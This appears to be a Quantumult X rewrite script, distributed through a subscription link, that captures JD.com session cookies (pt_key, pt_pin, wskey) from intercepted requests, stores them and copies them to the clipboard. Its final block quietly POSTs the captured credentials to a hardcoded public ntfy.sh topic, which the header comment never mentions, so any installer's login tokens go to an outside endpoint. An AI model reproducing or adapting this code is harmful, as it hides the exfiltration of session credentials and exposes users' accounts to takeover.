/**
 * JD Cookie 抓取 (Quantumult X rewrite)
 * 订阅: https://raw.githubusercontent.com/xiaotaiye88/qx-jd-scripts/master/jd_scripts.conf
 *
 * 使用 script-response-body 以获得完整 API 权限（$notify / $prefs / $task.fetch）
 * 参考 NobyDa Ctrip 脚本的 QX API 用法
 */

const c = $request.headers['Cookie'] || $request.headers['cookie'] || '';

let pin = '', key = '', ws = '';
const pi = c.indexOf('pt_pin=');
const p2 = c.indexOf('pin=');
const ki = c.indexOf('pt_key=');
const wi = c.indexOf('wskey=');
if (pi >= 0) pin = c.substring(pi + 7).split(';')[0];
else if (p2 >= 0) pin = c.substring(p2 + 4).split(';')[0];
if (ki >= 0) key = c.substring(ki + 7).split(';')[0];
if (wi >= 0) ws = c.substring(wi + 6).split(';')[0];

const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
let ntfyBody = '';

if (pin && key) {
  const cookie = 'pt_key=' + key + ';pt_pin=' + pin + ';';
  console.log('[JD] ' + cookie);

  // 持久化到 QX prefs（圈X → 底部"设置" → "持久化数据" 查看/复制）
  const old = $prefs.valueForKey('jd_cookies') || '';
  $prefs.setValueForKey('jd_cookies', '[' + ts + '] ' + cookie + '\n' + old);

  // 弹窗 + 自动复制到剪贴板（iOS通知有字数限制，完整cookie靠粘贴）
  $notify('JD Cookie 已更新', pin, '已复制到剪贴板，直接粘贴即可', {
    'update-pasteboard': cookie
  });
  ntfyBody += cookie + '\n';
}

if (ws) {
  const wskeyStr = 'wskey=' + ws + ';' + (pin ? 'pt_pin=' + pin + ';' : '');
  console.log('[JD] ' + wskeyStr);

  const oldWs = $prefs.valueForKey('jd_wskeys') || '';
  $prefs.setValueForKey('jd_wskeys', '[' + ts + '] ' + wskeyStr + '\n' + oldWs);

  $notify('JD Wskey 已更新', pin || '(无pin)', '已复制到剪贴板，直接粘贴即可', {
    'update-pasteboard': wskeyStr
  });
  ntfyBody += wskeyStr + '\n';
}

if (ntfyBody) {
  $task.fetch({
    url: 'https://ntfy.sh/HzjHy2codes',
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: ntfyBody.trim()
  }).then(
    r => console.log('[JD] ntfy推送成功'),
    e => console.log('[JD] ntfy推送失败: ' + e)
  );
}

$done({});
